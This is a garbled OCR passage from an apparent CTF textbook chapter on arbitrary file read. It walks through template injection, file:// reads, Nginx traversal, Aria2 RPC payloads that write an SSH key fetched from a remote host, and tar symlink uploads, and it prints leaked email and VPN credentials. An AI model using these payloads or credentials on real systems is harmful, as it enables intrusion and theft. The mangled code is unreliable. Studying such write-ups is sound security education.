URL submitted by the user also has certain restrictions, which must be the locally
configured HOST (127.0.0.1). There is a problem here. The HOST part of the URL
we pass in the File protocol is empty, so this check can also be bypassed.
const checkURL = (shootur1) => {
const myURL = nev URL (shootur1)
return config SERVER_HOST. includes (myURL.host)
[Difficulty 】 Moderate.
【Knowledge】 The protocol supported by the browser and the use of view-source;
Node template injection; HTTP Request Header: Range.
【Challenge solving】 Through auditing the source code, we found the template
injection vulnerability and the server-side browser request rule and found the
solution direction: get the path of the flag, and read the content of the flag.
---
## Page 75
1.3 Arbitrary File Read Vulnerability
59
Fig, 1.72 Result
const path * require(' path°)
const constant = require[* ./constant°)
9Y13
168F9.
4020-A48C-3791F60AFB12°)
Fig, 1.73 Source code
oobbbc
000060000060060660660000000600606606600006000006006000060060060060060060060t
trrfto
1131111S11S11S11S111111111151151151151111111511511511511115115115115115115111151151151S111
Fig, 1.74 Result
const FLAG_PATH = path.resolve (constant ROOT_PATH, 1+*******1)
const FLAGFIL&NAME = process , env. FLAGFILENAME I1 +********1
Get the flag file name by injecting process.env.FLAGFILENAME through the
template, then get the directory where the entire Node application is located by
 indno on aomos-ma sn pue edun au qno d'stassaood Suoou
result parsed into HTML tags, as shown in Fig. 1.72.
Read the FLAG_PATH in config.js using fil:/f+ absolute path. See Fig. 1.73.
Read the contents of the flag, and use the Range keyword in the HTTP request
header to control the start byte and end byte of the output. The content of the flag file
eg aup jo ued eas ap ndno jouues sisanbau panp 1eu a&e| os s! asuaeqo sq u!
which needs to be truncated in the middle, see Fig. 1.74.
[Summary】 ① The arbitrary file reading vulnerability in the challenge has nothing
to do with NodeJS. In essence, it uses the protocol supported by the browser,
which is a relatively new challenge.
② The principle of reading files is to read on demand and not blindly. Reading the
contents of files blindly will waste time.
③ The same challenge related to using browser features is SEAFARING2 in the
same game, attacking selenium server through SSRF vulnerability, controlling
the browser to request file:// to read local files. Readers can search for this
challenge if they are interested.
---
## Page 76
09
1 Introduction to the Web
1.3.3.6 Translate (Google CTF 2018)
【Intro】 According to the {{userQuery}} returned by the challenge, we can quickly
think that the challenge is template injection, which can be tested using the mathe-
matical expression ({ 3*3 }.
"in_1ang_quezy_is_spe1led*: *In french, { {userQuery}} 1s
spe11ed
 *,
Using ( (this.Sparent.Sparent.window.angular.module(demo')._invokeQueue[3]
[2][1]} to read some code snippets and found that i18n.template is used to render
the template, through i18n .template(./flag.txt') reads the flag.1
(Scomple, Ssce, i18n) =>; [
atum {
restfd: X',
Ink: (soope, element, efirs) =>; (
 (atrs[myindlude]/match(/,hm5(js5json&/) (
frow new Emror Include should only indutde hml, json or ja fies d_'):
++jinoguo/snoe)
 (eoursionCount >= 20){
I/' ng-include a template that ng-include a template fhat.
frow Eror( Thafs tce scursise d_o');
[Difficulty 】 Moderate.
【Knowledge】 Node template injection; read flag through i18n.template.
【Challenge solving】 First, find template injection, use template injection to
collect information, after obtaining enough information, use template injection,
call the file reading function to read the flag file.
【Summary】 The challenge involves knowledge of Node template injection,
requiring players to understand the template's syntax; converting the template
injection vulnerability into a file reading vulnerability.
---
## Page 77
1.3 Arbitrary File Read Vulnerability
61
1.3.3.7 Watching Animated Get the Flag (PWNHUB)
【Intro】 Scanning the subdomains, I found a site that recorded the challenge envi-
ronment building process (blog.loli.network) and found that the Nginx configuration
file is as follows:
1ocation /bangumi {
alias /var/www/htm1/bangumi / ;
1ocation /admin {
alias /vax/w/htm1/yaaw/ ;:
After exploiting the directory traversal, the Aria2 configuration file is found in the
parent directory, see Fig. 1.75.
It was also discovered that the Aria2 service is open on port 6800 of the challenge
server.
enable-zpc=true
rpc-al1ow-origin-a11=true
disable-ipv6=true
seed-time=0
rpc-1isten-a11=true
rpc-secret=FLAG{infactthiaianotthecorrectflag)
[Difficulty 】 Moderate.
[Knowledge】 Nginx misconfiguration leading to directory traversal; Aria2 arbi-
trary file write vulnerability.
[Challenge solving】 First, collect the necessary information, including direc-
tories, subdomains, etc. Nginx configuration errors were discovered during the test
(according to the Nginx configuration file obtained in the previous information
collection step, the directory traversal vulnerability can also be found directly
→Chbi
Indexof/bangumi../
31-My-2017 23:54
33-14y-2017
10:53
13-3un-28G7
3-3un
2927
1118
25:9
-Ma
04124
Fig, 1.75 Get the Aria2 configuration file
---
## Page 78
62
1 Introduction to the Web
to understand the features of Nginx and its Possible vulnerabilities. This can also
save us the time required for information collection and go directly to the second step
of solving the challenge). Use the Ngnix directory to traverse to obtain the Aria2
configuration file, get the rpc-secret, and use the rpc-secret to use the Aria2 arbitrary
file writing vulnerability to write the ssh public key to the server.
First, send the following payload to configure the server-side allowoverwrite
option to be true.
"jsonrpc":"2 . o",
"id":1,
"method" : "ar1a2 . changeGlobalOption",
“params" :
*token:FLAG{infactthiaianotthecorrectflag}*,
"allowoverwrite" :"true*
Then call the API to download the remote file, overwrite any local file (here,
directly overwrite the SSH public key), and log in to get the flag through SSH.
"jsonrpc" : "2 . 0",
"d":1,
"method" : "aria2 . addUri*,
"parama " :
*token: FLAG{infactthiaianotthecorrectflag)*,
[*http:/ /x.x.x.x/1.txt] ,
*dir*:*/home/bangumi / ssh*,
"out" : "Authorized_keys*.
1.3.3.8The Year 2013 (PWNHUB)
[Intro】 (1) The .DS_Store file is found to exist. See Fig. 1.76.
(2) The .DS_Store file leaks the current directory structure. Through analysis of the
.DS_Store file, it is found that there are directories such as upload and pwnhub.
---
## Page 79
1.3 Arbitrary File Read Vulnerability
63
0-60
6:0:0n6105rn1og000-006-0.0c0.9:0:0:11gcb1s96600.6000160006600
65/6060906=00920:616/6000692006:01616:900/69g6:6=6x6_610.616.056/64
Fig, 1.76 Get .DS_Store
(3) The pwnhub directory is configured to be forbidden in the Nginx file (the Nginx
configuration file cannot be obtained in the early stage of the game and can only
be judged by HTTP code 403). The configuration content is as follows.
location /pumhub/ {
deny a11 ;
(4) There is a hidden directory at the same level in pwnhub, the index.php file under
it can upload any TAR compressed package, and the Python script is called to
automatically decompress the uploaded compressed package, and at the same
time, the content of the file with the suffix of .cfg in the compressed package is
returned.
dud >
header ( Content -Type:text/html ; charset =utf -8′) ;
/ / Set the encoding to UrF-8 to avoid garbled Chinese characters
# Quit when no files are uploaded
Sfile = S_FILEs [*upload] ;
# Filenane Unpredictability
Ssalt = Base64_encode (*8gss7sd09129ajcjai2283u821hcsass′) .nt_rand
(80, 65535) ;
if (1isset (S_FILEs [′upload′]) or :is_uploaded_file (Sile
Sname = (md5 (md5 (Sfi1e [name ′] . $salt) . Ssalt) - * . taz′) ;
[′tmp_name'])] {
exit ;
# Move files to the appropriate folder
if (move_up1oaded_file (Sfile [′ tmp_name°] , "/tmp/pwnhub/$name*) > {
Scfgtame = trin (she11_exec ( 'python /usr/local/nginx/html/
Sname) ) ; and Sname1 1 ;
6c58c8751bca32b9943b34d0ff29bc16/untar-py /tmp/pwnhub/′
Scfgtame = trin (ScfgName) :
echo The update configuration is successful, with the following
contents";
// echo ' ;
echo '′ ;
readfi1e (*/tmp/pwmhub/ScfgName*) :
echo '' ;
---
## Page 80
9
1 Introduction to the Web
echo (*Fai1ed!*) ;
else(
? >
#/usz/1oca1/nginx/html/6c58c8751bca32b9943b34d0ff29bc16/untar -pY
import tarfile
import uuid
import sys
import o8
def untar (filenane) :
os . chdix (+ /tmp/pwnhub/ *)
for i in t getnames () :
t = tarflle .open (filename, *r")
if '... + in i or * cfg* 1 = oa ,path.splitext (i) [1] :
else :
return 'error'
try :
t .extract (1, /tmp/pwnhub/)
except Exception, e:
return e
else:
cfgName = stx (uuid. uuid1 (1) + * cfg
os.rename (1, cfgName)
if _nane__ - '_main_':
return cfgtame
filename = sys.argv [1]
if not tartile.ia_tarfile (filename) :
exit ('error*)
else :
print untar (filename)
(5) By analyzing the Linux crontab tasks, it was found that there exists a cron task
30 + + + + root sh /home/jdoajdoiq/jdijiqjvi/jiqji12i3198ua
x192/cron_zun.sh
(6) cron_run.sh executes a Python script that sends an email, which reveals the email
account and password.
#coding:utf - 8
from emai1 mine text import NIMEText
import sntp1ib
mai1_user = 'ctf_dicha921cn.com'
mai1_pass = 634DRaC62ehNK6X
mai1_sezver = 'smtp.21cn.com'
mail_port = 465
---
## Page 81
1.3 Arbitrary File Read Vulnerability
65
收件人
Flajia×
抄送|密送
请妥善保管您的VPN信息
添加附件（最大20M）
正文
BIu明AA三课X
IPsec VPN server is now ready for use!
Connect to your new VPN with these detals:
IPsec PSK: dkQ97gGQPuVm833Ed2F9
Server IP; 54.223.177.152
Password: LE3U2aTgc4DGZd92wg82
Write these down. You'll need them to connect!
Fig, 1.77 Mail content
(7) Login via the leaked email information and continue to find the leaked VPN
account password in the email. See Fig. 1.77.
 (8) Login to the intranet via VPN and find an Nginx container with a readable flag
application, but when accessing the application, only Oh Hacked is displayed,
and no other output is available. There is a Discuz! X 3.4 application with
Apache as a container on other ports under the same IP.
$flag = "soooooooxx ;
include *aafe-php' ;
if ($_Reguesr [*passud*] =*jiajiajiajia′)(
echo Sflag;
[Difficulty 】 Moderate.
【Knowledge】 Nginx has a vulnerability that allows unauthorized access to a
directory, leading to a file reading vulnerability; construct a zip file with a soft link
---
## Page 82
1 Introduction to the Web
He rm.  Aoor
 2,
Fig, 1.78 Result
→C  54.223.177.152/6c58c8751bca32b
选排文件未选择任何文件
上传
Fig, 1.79 Upload form
file, upload the zip file and read target iles; Discuz!X 3.4 has arbitrary file deletion
vulnerability.
[Challenge solving】 Scan the directory to find .DS_Store (a file automatically
generated by default under macOS, which is mainly used to record the location of
files in the directory, so there will be file names and other information), and get all
sub-dirs and files in the current directory by parsing the DS_Store file.
from ds_store import Dsstore
with DsStore.open (*Ds_Store", *r+*) as f :
for i in f :
print 1
I found an extra space at the end of the upload directory name and thought that a
vulnerability in Nginx parsing (CVE-2013-4547) could be used to bypass the
pwnhub directory permissions restriction. The idea is to use the Nginx parsing
vulnerability to fail to match the regular expression /pwnhub in the Nginx configu-
ration file, see Fig. 1.78.
In the /pwnhub directory, there exists a directory of the same level in which the
PHP file exists. Requesting the PHP file, an upload form is found to exist. See
Fig. 1.79.
Upload the TAR archive file through the PHP file, and find that the application
will automatically decompress the uploaded archive (tarfile.open), so you can first
construct the soft link file locally with the command In -s, modify the file name to
XXx.cfg, and then compress it with tar command. After uploading the TAR package,
it will output a soft link to the file's contents (see Fig. 1.80).
Reading /etc/crontab reveals that a strange cron task has been started in crontab,
---
## Page 83
1.3 Arbitrary File Read Vulnerability
67
Fig, 1.80 Result
选择文件未选择任何文件
上传
注意：只支持tar!!
更新配置成功，内容如下
root:x:0:0:root:/root:/bin/bash
daemonact:1:daemon:/usr/sbin
bino:2:2:bin/bin/usr/sbin/nolo
/usr/sbin/nologin
sysoc:3:3:sys:/dec/usr/sbin/nol
gin
synea04:65534:syne:/bin/bin/s
ogin
gamescxc5:60:games/usr/game
ync
manoc6:12:manc/var/cache/ma
s:usrjsbinynologin
px7:7:p/var/spool/pd:/us/s
n:/usr/sbin/nologin
[bin/nologin
位置：自动
Wi-Fi
状态：已连接
连接时间：
IP地址：192.168.43.12
1:48:42
LPSS S.apter (t
LPSS S..
apter (2)
服务器地址：54.223.177.152
东配置
帐户名称：
随牙PAN
密码：
签定设置
新开连
Phone USB
Fig, 1.81  vpn login
x192/eron_run.sh
30 ＋ + + + root sh /home/jdoadoig/diq w/iqi12i3198ua
Read the sh script called in crontab and find a Python script running internally;
then read the Python script to get the leaked mailbox account and password, log in to
the mailbox and get the leaked VPN account and password (see Fig. 1.81).
---
## Page 84
68
1 Introduction to the Web
Fig, 1.82 Get flag
get flag?
×+
172.17.0.3/index.php?pass
wd=lajiajlajlaja
最常访问火提官方站点新手上路常用网址D京
NT
SQLBASICS*UNION BASED*ERROF
Load URL
Spit URL
Execute
Post dataReferrerOxHEX
pwnhub(flag:800eaf3244994b224c30e5f24b59f178)
Fig, 1.83 Writeup
/etc/pass
After successfully connecting to the VPN, I scanned the VPN's intranet and found
the deployed Discuz!X 3.4 application and a flag reading service. Using arbitrary file
deletion vulnerability of Discuz!X 3.4 to delete safe.php, see Fig. 1.82.
【Summary】 ① The challenge resolution process is long, and players should have
clear ideas.
② In addition to directory traversal caused by improper configuration of Nginx, it
also has historical vulnerabilities that can leak information.
The idea of solving this problem is shown in Fig. 1.83. There are many challenges to
read arbitrary files by constructing soft links, such as extractOr of 34c3CTF, which